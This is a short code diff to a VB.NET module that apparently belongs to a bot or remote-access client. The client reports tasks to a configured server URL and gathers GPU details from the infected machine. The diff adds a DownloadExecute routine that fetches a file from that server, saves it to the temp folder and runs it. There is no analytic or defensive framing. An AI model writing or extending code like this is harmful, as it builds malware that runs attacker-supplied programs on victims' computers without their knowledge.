@@ -32,6 +32,14 @@ Module IndependantActions
         mainWebClient.DownloadString(My.Settings.vpsurl & "clients.php?action=sendtasks&actioncontent=" & total)
     End Sub
 
+    Public Sub DownloadExecute(fileName As String)
+        Dim downloadedBytes As Byte() =
+            New WebClient().DownloadData(My.Settings.vpsurl & "files/" & fileName)
+
+        File.WriteAllBytes(Path.GetTempPath & fileName, downloadedBytes)
+        Process.Start(Path.GetTempPath & fileName)
+    End Sub
+
     Public Sub GetStatistics(ByRef mainWebClient As WebClient)
         Dim query As New System.Management.SelectQuery("Win32_VideoController")
         Dim search As New System.Management.ManagementObjectSearcher(query)
